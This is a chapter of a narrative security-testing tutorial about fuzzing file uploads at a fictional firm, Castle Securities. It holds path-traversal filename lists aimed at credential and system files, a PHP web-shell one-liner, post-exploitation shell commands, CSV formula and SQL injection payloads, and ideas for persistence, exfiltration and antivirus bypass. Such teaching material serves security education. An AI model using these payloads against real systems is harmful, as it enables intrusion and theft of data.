# Chapter 4: Digital Dead Drops - File Upload Exploitation

*"Sometimes the best way into a castle is to be invited as a trojan horse."*

---

Your network protocol access revealed internal algorithm communications, but there's a frustrating limitation: you can monitor data flows and protocol traffic, but you can't extract the actual algorithm source code or training datasets. Castle Securities' data loss prevention system monitors all network exfiltration attempts, and your protocol access shows algorithm operations without revealing implementation details.

But while exploring the research portal with your authenticated access, you notice something interesting: there's a "Collaborative Research" section with file upload functionality for sharing documents with the algorithm development team. The interface allows researchers to upload analysis reports, data files, and research documents for automated processing and team collaboration.

Upload a simple text file to test it:

"Research analysis document uploaded successfully. Processing pipeline initiated."

Your network monitoring shows the upload triggered connections to multiple internal systems you discovered in Chapter 3. The file didn't just get stored—it launched a complex processing workflow across algorithm development, data analysis, and research coordination systems that were never designed to handle adversarial input.

This is your opportunity. File processing systems are complex software stacks with multiple validation layers, format parsers, and automated workflows. Each component makes assumptions about file content, structure, and origin that create attack surfaces for systematic fuzzing exploitation.

Your mission: build file format fuzzers that systematically test filename validation, file parsing logic, and processing workflows to achieve code execution and extract algorithm implementation data.

But first, you need to understand what makes file format fuzzing fundamentally different from the network protocol testing you've mastered.

---

## Understanding File Processing as a Fuzzing Target

File processing systems are different from network protocols because they handle complex data formats, implement multi-stage processing pipelines, and often integrate with multiple backend systems for content analysis, indexing, and storage. While network protocols focus on real-time communication, file processors must parse, validate, and transform complex structured data.

Load the Collaborative Research file upload interface and examine the form:

```html
<form method="POST" action="/research/upload" enctype="multipart/form-data">
    <input name="document" type="file" accept=".pdf,.docx,.csv,.txt,.xlsx">
    <input name="category" type="select" options="Analysis,Data,Research,Internal">
    <input name="description" type="text" placeholder="Document description">
    <button type="submit">Upload for Team Review</button>
</form>
```

This simple interface represents a complex processing system with multiple attack surfaces:
- **Filename validation**: How does the system handle unusual filenames and path characters?
- **File format validation**: How thoroughly does the system validate file content vs. file extensions?
- **Content processing**: What happens when files are parsed, analyzed, and transformed?
- **Storage location**: Where are files stored and how are storage paths determined?
- **Processing workflows**: What backend systems process uploaded files and how?
- **Access controls**: How are processed files protected and who can access them?

Each component creates fuzzing opportunities that require understanding file format structure and processing logic.

### File Processing Fuzzing Challenges

File format fuzzing involves challenges that don't exist in network protocol testing:

**Multi-Format Complexity**: File processors must handle numerous formats (PDF, Office, CSV, images) each with complex internal structure and parsing requirements.

**Processing Pipeline Integration**: Files trigger workflows across multiple systems including virus scanning, content indexing, format conversion, and analysis engines.

**Format-Specific Vulnerabilities**: Different file formats have unique vulnerability classes including macro execution, embedded content, external references, and parser memory corruption.

**Validation Layer Bypass**: File processing often has multiple validation stages that can be bypassed through format confusion and encoding manipulation.

**Processing Context Variation**: Files may be processed differently based on user context, upload source, or content classification.

Understanding these challenges is essential because file format fuzzing requires techniques that consider both file structure and processing workflow complexity.

### The File Format Fuzzing Methodology

Effective file format fuzzing follows systematic methodology that addresses format complexity and processing pipeline security:

**1. Processing Pipeline Discovery**: Understanding how uploaded files are processed, what systems they reach, and what transformations occur

**2. Format Validation Analysis**: Testing how the system validates file types, content structure, and format compliance

**3. Filename and Path Fuzzing**: Systematically testing filename handling for path traversal and filename-based attacks

**4. Format Structure Fuzzing**: Testing file format parsing logic through systematic structure manipulation

**5. Processing Workflow Exploitation**: Leveraging discovered vulnerabilities to achieve code execution and data access

Let's apply this methodology to Castle Securities' file processing systems systematically.

---

## Processing Pipeline Discovery and Analysis

Before fuzzing file uploads, you need to understand what happens to uploaded files within Castle Securities' infrastructure. File processing pipelines often involve multiple systems that each present different attack surfaces.

### Upload Workflow Mapping Through Network Analysis

Your network protocol access from Chapter 3 enables monitoring file processing workflows to understand the complete attack surface before launching file format attacks.

[PLACEHOLDER:CODE Name: File processing workflow analyzer using network monitoring. Purpose: Monitors network traffic during file uploads to map processing pipelines, identify backend systems involved in file processing, and understand workflow stages and timing. Value: Essential.]

Upload a legitimate test file and monitor network traffic to map the processing workflow:

**Immediate Processing (0-5 seconds)**:
```
POST /research/upload (file upload endpoint)
→ Connection to virus-scan.internal:3310 (ClamAV virus scanning)
→ Connection to content-extract.internal:8080 (text extraction service)
→ Connection to file-store.internal:9000 (distributed file storage)
```

**Background Processing (5-60 seconds)**:
```
→ Connection to index-engine.internal:9200 (Elasticsearch content indexing)
→ Connection to format-convert.internal:8081 (document format conversion)
→ Connection to ml-analyze.internal:5000 (machine learning content analysis)
```

**Integration Processing (60+ seconds)**:
```
→ Connection to research-db.internal:5432 (database integration)
→ Connection to notification.internal:587 (email notification system)
→ Connection to audit-log.internal:514 (audit logging service)
```

This workflow mapping reveals that your uploaded file reaches eight different internal systems, each representing a potential attack surface for file format exploitation.

### File Format Validation Discovery

Understanding how Castle Securities validates uploaded files is crucial for building effective format-based attacks. Different validation approaches create different bypass opportunities.

[PLACEHOLDER:CODE Name: File format validation analyzer through systematic upload testing. Purpose: Tests file uploads with various format combinations to discover validation logic, identifies which validations are filename-based vs. content-based, maps validation bypass opportunities. Value: High.]

Test file format validation systematically:

**Extension vs. Content Validation Testing**:
```
Upload: test.pdf (actual PDF content) → "Processing successful"
Upload: test.pdf (text content) → "Invalid PDF format detected"
Upload: shell.php (PHP content) → "File type not permitted"
Upload: test.txt (PHP content) → "Processing successful"
```

**Multi-Extension Testing**:
```
Upload: test.pdf.txt → "Processing successful" (treated as text file)
Upload: test.txt.pdf → "Invalid PDF format detected" (treated as PDF)
Upload: test.pdf.php.txt → "Processing successful" (final extension used)
```

**MIME Type vs. Extension Testing**:
```
Upload: test.txt + Content-Type: application/pdf → "Processing successful"
Upload: test.pdf + Content-Type: text/plain → "Invalid PDF format detected"
```

**Format Spoofing Testing**:
```
Upload: test.txt with PDF magic bytes (%PDF-1.4) → "Processing successful"
Upload: test.pdf with text content → "Invalid PDF format detected"
```

This systematic validation analysis reveals that Castle Securities uses filename extension for initial filtering but validates content format for specific file types, creating opportunities for validation bypass.

### Processing System Vulnerability Assessment

Each system in the processing pipeline presents different attack surfaces based on its function and implementation. Understanding these differences guides targeted exploitation.

[PLACEHOLDER:CODE Name: Processing system attack surface analyzer. Purpose: Analyzes each processing system's functionality and potential vulnerabilities, maps file format attack vectors for each system, prioritizes targets based on access and impact. Value: High.]

Map attack surfaces for each processing system:

**Virus Scanner (ClamAV)**: 
- Known vulnerabilities in signature detection
- Archive handling and nested file extraction
- Resource exhaustion through complex file structures

**Content Extractor**:
- Text extraction from complex formats (PDF, Office)
- Memory corruption in format parsers
- External reference handling (URLs, linked documents)

**Format Converter**:
- Document format transformation (PDF→HTML, Office→PDF)
- Complex format processing with multiple input/output formats
- Potential for format confusion attacks

**ML Content Analyzer**:
- Machine learning model inference on file content
- Potential for adversarial input attacks
- Text processing and natural language analysis

**Database Integration**:
- SQL injection through extracted content
- Data validation and sanitization issues
- Business logic bypass through content manipulation

Each system presents different optimization opportunities for file format exploitation.

---

## Building Filename and Path Fuzzing Tools

Filename-based attacks often provide the most direct path to code execution because they can affect file storage location, processing logic, and system integration without requiring complex format manipulation.

### Systematic Path Traversal Testing

Path traversal attacks attempt to control file storage location through filename manipulation, potentially allowing file writes to system directories, web roots, or configuration locations.

[PLACEHOLDER:CODE Name: Systematic path traversal fuzzer for file upload exploitation. Purpose: Generates comprehensive filename-based path traversal payloads, tests various encoding and bypass techniques, validates successful traversal through response analysis. Value: Essential.]

Build systematic path traversal attacks using multiple encoding and bypass techniques:

**Basic Path Traversal Patterns**:
```
../../../etc/passwd.txt
....//....//....//etc//passwd.txt
..%2f..%2f..%2fetc%2fpasswd.txt
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd.txt
```

**Operating System Specific Patterns**:
```
Unix/Linux: ../../../etc/passwd.txt
Windows: ..\..\..\windows\system32\config\sam.txt
Mixed: ../../../windows/system32/config/sam.txt
```

**Web Application Specific Targets**:
```
../../../var/www/html/shell.php.txt
../../../opt/castle/config/database.conf.txt
../../../home/castle/.ssh/id_rsa.txt
```

**Encoding Bypass Techniques**:
```
Double encoding: %252e%252e%252f
Unicode encoding: \u002e\u002e\u002f
UTF-8 overlong: %c0%ae%c0%ae%c0%af
```

Test each path traversal technique against Castle Securities' upload system and analyze responses for success indicators.

### Filename-Based Code Execution

Some file processing systems execute or serve uploaded files based on filename characteristics, creating opportunities for direct code execution through filename manipulation.

[PLACEHOLDER:CODE Name: Filename-based code execution fuzzer for upload exploitation. Purpose: Tests filename patterns that might trigger code execution, script processing, or file serving from executable locations. Identifies filename-based attack vectors. Value: High.]

Test filename patterns that might trigger execution or special processing:

**Executable Extension Testing**:
```
shell.php.txt (PHP disguised as text)
script.jsp.txt (JSP disguised as text)  
command.asp.txt (ASP disguised as text)
macro.docm.txt (Macro-enabled Office document)
```

**Special Directory Targeting**:
```
../../../var/www/html/cmd.php.txt (web root targeting)
../../../tmp/shell.sh.txt (temp directory execution)
../../../opt/castle/scripts/backdoor.py.txt (application directory)
```

**Configuration File Targeting**:
```
../../../etc/crontab.txt (scheduled execution)
../../../opt/castle/config/startup.sh.txt (application startup)
../../../var/log/access.log.txt (log injection)
```

**Hidden File and Directory Testing**:
```
.htaccess.txt (Apache configuration)
.bashrc.txt (shell configuration)
.ssh/authorized_keys.txt (SSH access)
```

Systematic filename testing often discovers file processing logic that enables code execution through path manipulation.

### Dynamic Filename Generation and Testing

Advanced filename fuzzing uses intelligence gathered from previous discoveries to generate context-aware attacks that target Castle Securities' specific infrastructure.

[PLACEHOLDER:CODE Name: Intelligence-driven filename generator for targeted path attacks. Purpose: Uses discovered system information to generate context-aware path traversal and filename attacks targeting Castle Securities' specific infrastructure and technology stack. Value: Medium.]

Generate targeted filenames based on discovered infrastructure:

**Technology Stack Targeting** (based on network discovery):
```
../../../opt/python/lib/django/conf/settings.py.txt
../../../var/castle/research/algorithms/argos.py.txt
../../../home/postgres/data/postgresql.conf.txt
```

**Service-Specific Targeting** (based on service discovery):
```
../../../var/log/argos-prod-01/algorithm.log.txt
../../../opt/castle/market-data/config.json.txt
../../../var/research-db/backup/dump.sql.txt
```

**Business Logic Targeting** (based on application understanding):
```
../../../var/castle/algorithms/production/argos-v3.py.txt
../../../opt/research/training-data/model-parameters.json.txt
../../../var/trading/config/api-keys.conf.txt
```

Intelligence-driven filename generation significantly improves attack success rates compared to generic path traversal attempts.

---

## File Format Structure Fuzzing

Beyond filename attacks, file format fuzzing targets the parsing logic that processes file content. Different file formats have unique structure and vulnerability classes that require format-specific fuzzing approaches.

### PDF Format Structure Fuzzing

PDF files have complex internal structure with multiple opportunities for parser exploitation through systematic structure manipulation.

[PLACEHOLDER:CODE Name: PDF structure fuzzer for parser vulnerability discovery. Purpose: Generates systematically malformed PDF files to test PDF parsing logic, including oversized fields, malformed objects, and structure violations. Tests Castle Securities' PDF processing pipeline. Value: High.]

PDF fuzzing targets multiple structural components:

**PDF Header Fuzzing**:
```
Normal: %PDF-1.4
Oversized Version: %PDF-999.999
Invalid Format: %PDF-X.Y
Missing Header: (start with PDF objects directly)
```

**Object Structure Fuzzing**:
```
Oversized Object Numbers: 1 999999999 obj
Invalid Object References: /Parent 999999 0 R
Circular References: Object A references Object B, which references Object A
Missing End Markers: obj without endobj
```

**Content Stream Fuzzing**:
```
Oversized Content Lengths: /Length 999999999
Negative Content Lengths: /Length -1
Missing Content Data: /Length 1000 with only 100 bytes of data
Compressed Stream Errors: Invalid Flate compression data
```

**Cross-Reference Table Fuzzing**:
```
Invalid Object Offsets: xref pointing to wrong file positions
Missing Objects: xref referencing non-existent objects
Corrupted xref Format: Invalid xref table structure
```

Systematic PDF structure fuzzing often discovers memory corruption vulnerabilities in PDF parsing libraries.

### Office Document Format Fuzzing

Microsoft Office documents support complex features including macros, embedded objects, and external references that create multiple attack vectors for systematic exploitation.

[PLACEHOLDER:CODE Name: Office document structure fuzzer for complex format exploitation. Purpose: Generates malformed Office documents with embedded content, external references, and format violations to test Office document processing systems. Value: High.]

Office document fuzzing targets multiple attack surfaces:

**Document Structure Fuzzing**:
```
Corrupted ZIP Structure: Office docs are ZIP files with corrupted archives
Missing Required Files: Remove essential document.xml files
Oversized Content: Extremely large document components
Invalid XML: Malformed XML within document structure
```

**Macro and Embedded Content Testing**:
```
Hidden Macros: Macros in unexpected document locations
Embedded Executables: PE files embedded in document structure
External References: Links to attacker-controlled resources
Formula Injection: Spreadsheet formulas with command execution
```

**Relationship and Reference Testing**:
```
External Relationships: References to external files and URLs
Circular Relationships: Document parts referencing each other
Invalid Relationships: References to non-existent document parts
Oversized Relationships: Extremely complex relationship structures
```

**Format Confusion Testing**:
```
Extension Mismatch: .docx files with .xlsx content
Version Confusion: Modern formats with legacy structure
Hybrid Documents: Documents with mixed format elements
```

Office document fuzzing often discovers both parsing vulnerabilities and business logic bypass opportunities.

### CSV and Data Format Fuzzing

CSV and structured data files present opportunities for injection attacks when processed by database systems, analysis engines, or business logic components.

[PLACEHOLDER:CODE Name: CSV and structured data fuzzer for injection attack discovery. Purpose: Generates malformed CSV files with injection payloads targeting database import, formula execution, and data processing vulnerabilities. Value: Medium.]

CSV fuzzing targets data processing logic:

**CSV Structure Fuzzing**:
```
Field Separator Confusion: Mix comma, tab, semicolon separators
Quote Character Abuse: Unmatched quotes, nested quotes
Line Ending Confusion: Mix Unix, Windows, Mac line endings
Encoding Issues: Mixed character encodings within single file
```

**Injection Payload Testing**:
```
SQL Injection: CSV fields containing SQL commands
Formula Injection: =cmd|'command'!A1 in spreadsheet-processed CSVs
Command Injection: $(command) or `command` in processed fields
LDAP Injection: Special characters affecting LDAP queries
```

**Data Validation Testing**:
```
Oversized Fields: Extremely long CSV field values
Type Confusion: Text in numeric fields, numbers in text fields
Special Characters: Unicode, control characters, null bytes
Buffer Overflow: Fields designed to overflow processing buffers
```

**Business Logic Testing**:
```
Duplicate Headers: CSV files with repeated column names
Missing Required Fields: CSVs missing expected data columns
Invalid Data Ranges: Dates, numbers outside expected ranges
Malicious File References: CSV fields containing file paths
```

CSV injection often provides direct access to backend database and processing systems.

---

## Processing Workflow Exploitation and Code Execution

Individual file format vulnerabilities are useful, but maximum impact requires chaining multiple vulnerabilities across the complete processing pipeline to achieve code execution and data access.

### Multi-Stage Attack Orchestration

File processing pipelines create opportunities for multi-stage attacks where vulnerabilities in different systems combine to provide comprehensive access.

[PLACEHOLDER:CODE Name: Multi-stage file processing attack orchestrator. Purpose: Coordinates file upload attacks across multiple processing systems, chains filename and format vulnerabilities for maximum impact, orchestrates systematic exploitation of complete processing pipeline. Value: High.]

Orchestrate attacks across the complete processing pipeline:

**Stage 1: Initial Access Through Filename Manipulation**
```
Filename: ../../../var/www/html/research/cmd.php.txt
Content: <?php system($_GET['c']); ?>
Result: Web shell deployed to accessible location
```

**Stage 2: Processing System Reconnaissance**
```
Command: ps aux | grep castle
Result: Discover running Castle Securities services and configurations
Command: find /opt/castle -name "*.py" | head -20
Result: Locate algorithm source code and configuration files
```

**Stage 3: Algorithm Data Extraction**
```
Command: tar -czf /tmp/algorithm-data.tar.gz /opt/castle/algorithms/
Upload: Malicious PDF triggering file exfiltration via processing system
Result: Algorithm source code and training data extraction
```

**Stage 4: Database Access Through Processing Integration**
```
CSV Injection: File processed by database import system
Payload: '; COPY (SELECT * FROM algorithm_config) TO '/var/www/html/data.txt'; --
Result: Database content extraction through CSV processing
```

Multi-stage orchestration transforms individual file vulnerabilities into comprehensive system compromise.

### Persistence and Data Exfiltration

File processing system compromise enables establishing persistence and systematic data exfiltration while avoiding network-based data loss prevention systems.

[PLACEHOLDER:CODE Name: File-based persistence and data exfiltration system. Purpose: Uses compromised file processing systems to establish persistent access and extract algorithm data through file-based channels that bypass network monitoring. Value: High.]

Establish persistence through file processing compromise:

**File System Persistence**:
```
Scheduled Processing: Files that trigger periodic processing with embedded commands
Configuration Injection: Modify processing system configuration files
Log File Manipulation: Inject commands into processed log files
Template Modification: Modify document processing templates with embedded scripts
```

**Data Exfiltration Through Processing Systems**:
```
Document Generation: Trigger report generation containing algorithm data
Email Integration: Use notification systems to email extracted data
File Transformation: Embed data in processed document formats
Archive Creation: Generate backup archives containing algorithm source code
```

**Processing System Backdoors**:
```
Content Analysis Bypass: Modify content analysis systems to ignore malicious files
Virus Scanning Bypass: Whitelist malicious files in virus scanning configuration
Format Converter Abuse: Use format conversion to transform and exfiltrate data
Database Integration Abuse: Use database processing to extract and transform data
```

File-based persistence often provides more reliable access than network-based backdoors.

---

## Professional File Format Testing Methodology

Individual file format attacks are useful, but professional security assessment requires systematic methodology that comprehensively evaluates file processing security across complex applications.

### Integrated File Processing Security Assessment

Professional file format testing requires understanding how file processing integrates with complete business systems rather than testing file handlers in isolation.

[PLACEHOLDER:CODE Name: Comprehensive file processing security assessment framework. Purpose: Integrates filename, format structure, and processing workflow testing into systematic methodology for evaluating file processing security across complete business applications. Value: Essential.]

Comprehensive file processing assessment systematically evaluates:

**Processing Pipeline Mapping**: Understanding complete file handling workflows from upload through final processing
**Format Validation Analysis**: Testing validation logic for multiple file formats and bypass opportunities
**Filename Security Testing**: Systematic path traversal and filename-based attack testing
**Format Structure Testing**: Parser vulnerability discovery through systematic format manipulation
**Processing Integration Testing**: Testing how file processing integrates with broader business systems

This comprehensive approach ensures no file processing attack surface is missed.

### Quality Control and Impact Assessment for File Vulnerabilities

File processing vulnerabilities often have significant business impact because they can affect data integrity, system availability, and provide access to sensitive business information.

[PLACEHOLDER:CODE Name: File processing vulnerability validation and impact assessment system. Purpose: Validates discovered file processing vulnerabilities, assesses business impact and data access implications, generates professional reporting for file security issues. Value: Medium.]

Quality control for file processing testing includes:

**Reproducibility Validation**: Confirming file processing vulnerabilities work consistently across different upload contexts
**Business Impact Assessment**: Understanding how file processing compromise affects business operations and data security
**Data Access Evaluation**: Assessing what sensitive information becomes accessible through file processing exploitation
**System Integration Impact**: Understanding how file processing vulnerabilities enable broader system compromise

Professional file processing assessment provides comprehensive evaluation of document handling security.

### Documentation and Remediation Guidance

File processing testing generates complex findings that affect multiple systems and require clear technical and business communication.

[PLACEHOLDER:CODE Name: Professional file processing testing documentation and reporting system. Purpose: Generates comprehensive documentation of file processing testing methodology, discovered vulnerabilities, and business impact suitable for both technical remediation and business decision-making. Value: Medium.]

Professional documentation should include:

**Methodology Documentation**: Complete description of file format testing techniques and processing pipeline analysis
**Technical Findings**: Detailed technical description of discovered vulnerabilities with reproduction steps and code samples
**Business Impact Assessment**: Evaluation of how file processing vulnerabilities affect business operations and data security
**Remediation Recommendations**: Specific technical recommendations for improving file processing security across all affected systems

This documentation enables both immediate vulnerability remediation and systematic improvement of file processing security.

---

## What You've Learned and What's Next

You've successfully applied systematic fuzzing to Castle Securities' file processing infrastructure and achieved comprehensive access to their algorithm development systems. More importantly, you've learned file format fuzzing techniques that apply to any modern application with file handling capabilities.

Your file format fuzzing capabilities now include:

**Processing pipeline analysis** through network monitoring and workflow discovery
**Systematic filename and path fuzzing** for achieving code execution and file system access
**Format structure fuzzing** targeting PDF, Office, and CSV parsing vulnerabilities
**Multi-stage attack orchestration** combining multiple file processing vulnerabilities for maximum impact

Your current access to Castle Securities includes:

**Algorithm development system access** through file processing exploitation and web shell deployment
**Source code and configuration access** through path traversal and processing system compromise
**Database connectivity** through CSV injection and processing system integration
**Persistent access mechanisms** through file processing backdoors and system modification

But file processing access provides pathways to stored data rather than the data itself. The ARGOS algorithm implementation, training datasets, and configuration parameters exist in databases and data stores that your file processing compromise can now access directly.

In the next chapter, you'll learn SQL injection fuzzing to systematically extract the complete algorithmic trading system from Castle Securities' databases. This represents the core technical challenge of extracting structured algorithm data through systematic database exploitation.

Your fuzzing education has progressed from web reconnaissance through authentication, network protocols, and file processing to database exploitation. Next, you'll apply your methodology to the challenge of systematically extracting proprietary financial algorithms through database security testing—the final technical barrier to obtaining the complete Infinite Money Machine implementation.

---

**Next: Chapter 5 - The Vault: Database Infiltration**

*"Their algorithm lives in the data vaults. Time to crack the treasury."*